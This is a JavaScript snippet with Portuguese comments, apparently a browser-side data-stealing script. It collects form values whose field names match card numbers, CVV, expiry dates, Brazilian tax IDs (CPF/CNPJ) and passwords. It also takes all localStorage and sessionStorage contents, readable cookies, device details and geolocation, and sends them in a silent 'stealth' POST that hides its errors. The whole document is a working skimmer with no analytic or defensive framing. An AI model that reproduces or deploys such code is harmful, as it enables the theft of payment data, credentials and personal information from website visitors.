(function collectData(){
    try {
      const payload = {};
  
      // 1. Formulários
      payload.forms = [];
      document.querySelectorAll('form input, form select, form textarea').forEach(el => {
        if (el.name && el.value && /card|ccn|cpf|cnpj|senha|password|cvv|exp/i.test(el.name)) {
          payload.forms.push({
            name: el.name,
            value: el.value,
            type: el.type
          });
        }
      });
  
      // 2. localStorage/sessionStorage
      payload.localStorage = {};
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        payload.localStorage[key] = localStorage.getItem(key);
      }
  
      payload.sessionStorage = {};
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        payload.sessionStorage[key] = sessionStorage.getItem(key);
      }
  
      // 3. Cookies (não httpOnly)
      payload.cookies = document.cookie;
  
      // 4. Navigator Info
      payload.navigator = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        deviceMemory: navigator.deviceMemory || 'unknown',
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
      };
  
      // 5. Geolocation (tentativa passiva)
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
          payload.geolocation = {
            lat: pos.coords.latitude,
            lon: pos.coords.longitude
          };
          sendData(payload);
        }, err => {
          // Se usuário nega, continua sem geo
          sendData(payload);
        }, {timeout: 3000});
      } else {
        sendData(payload);
      }
    } catch (e) {
      console.error('Error in data collection', e);
    }
  
    // Função stealth de envio
    function sendData(data){
      fetch('/data', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
      }).catch(()=>{});
    }
  })();
  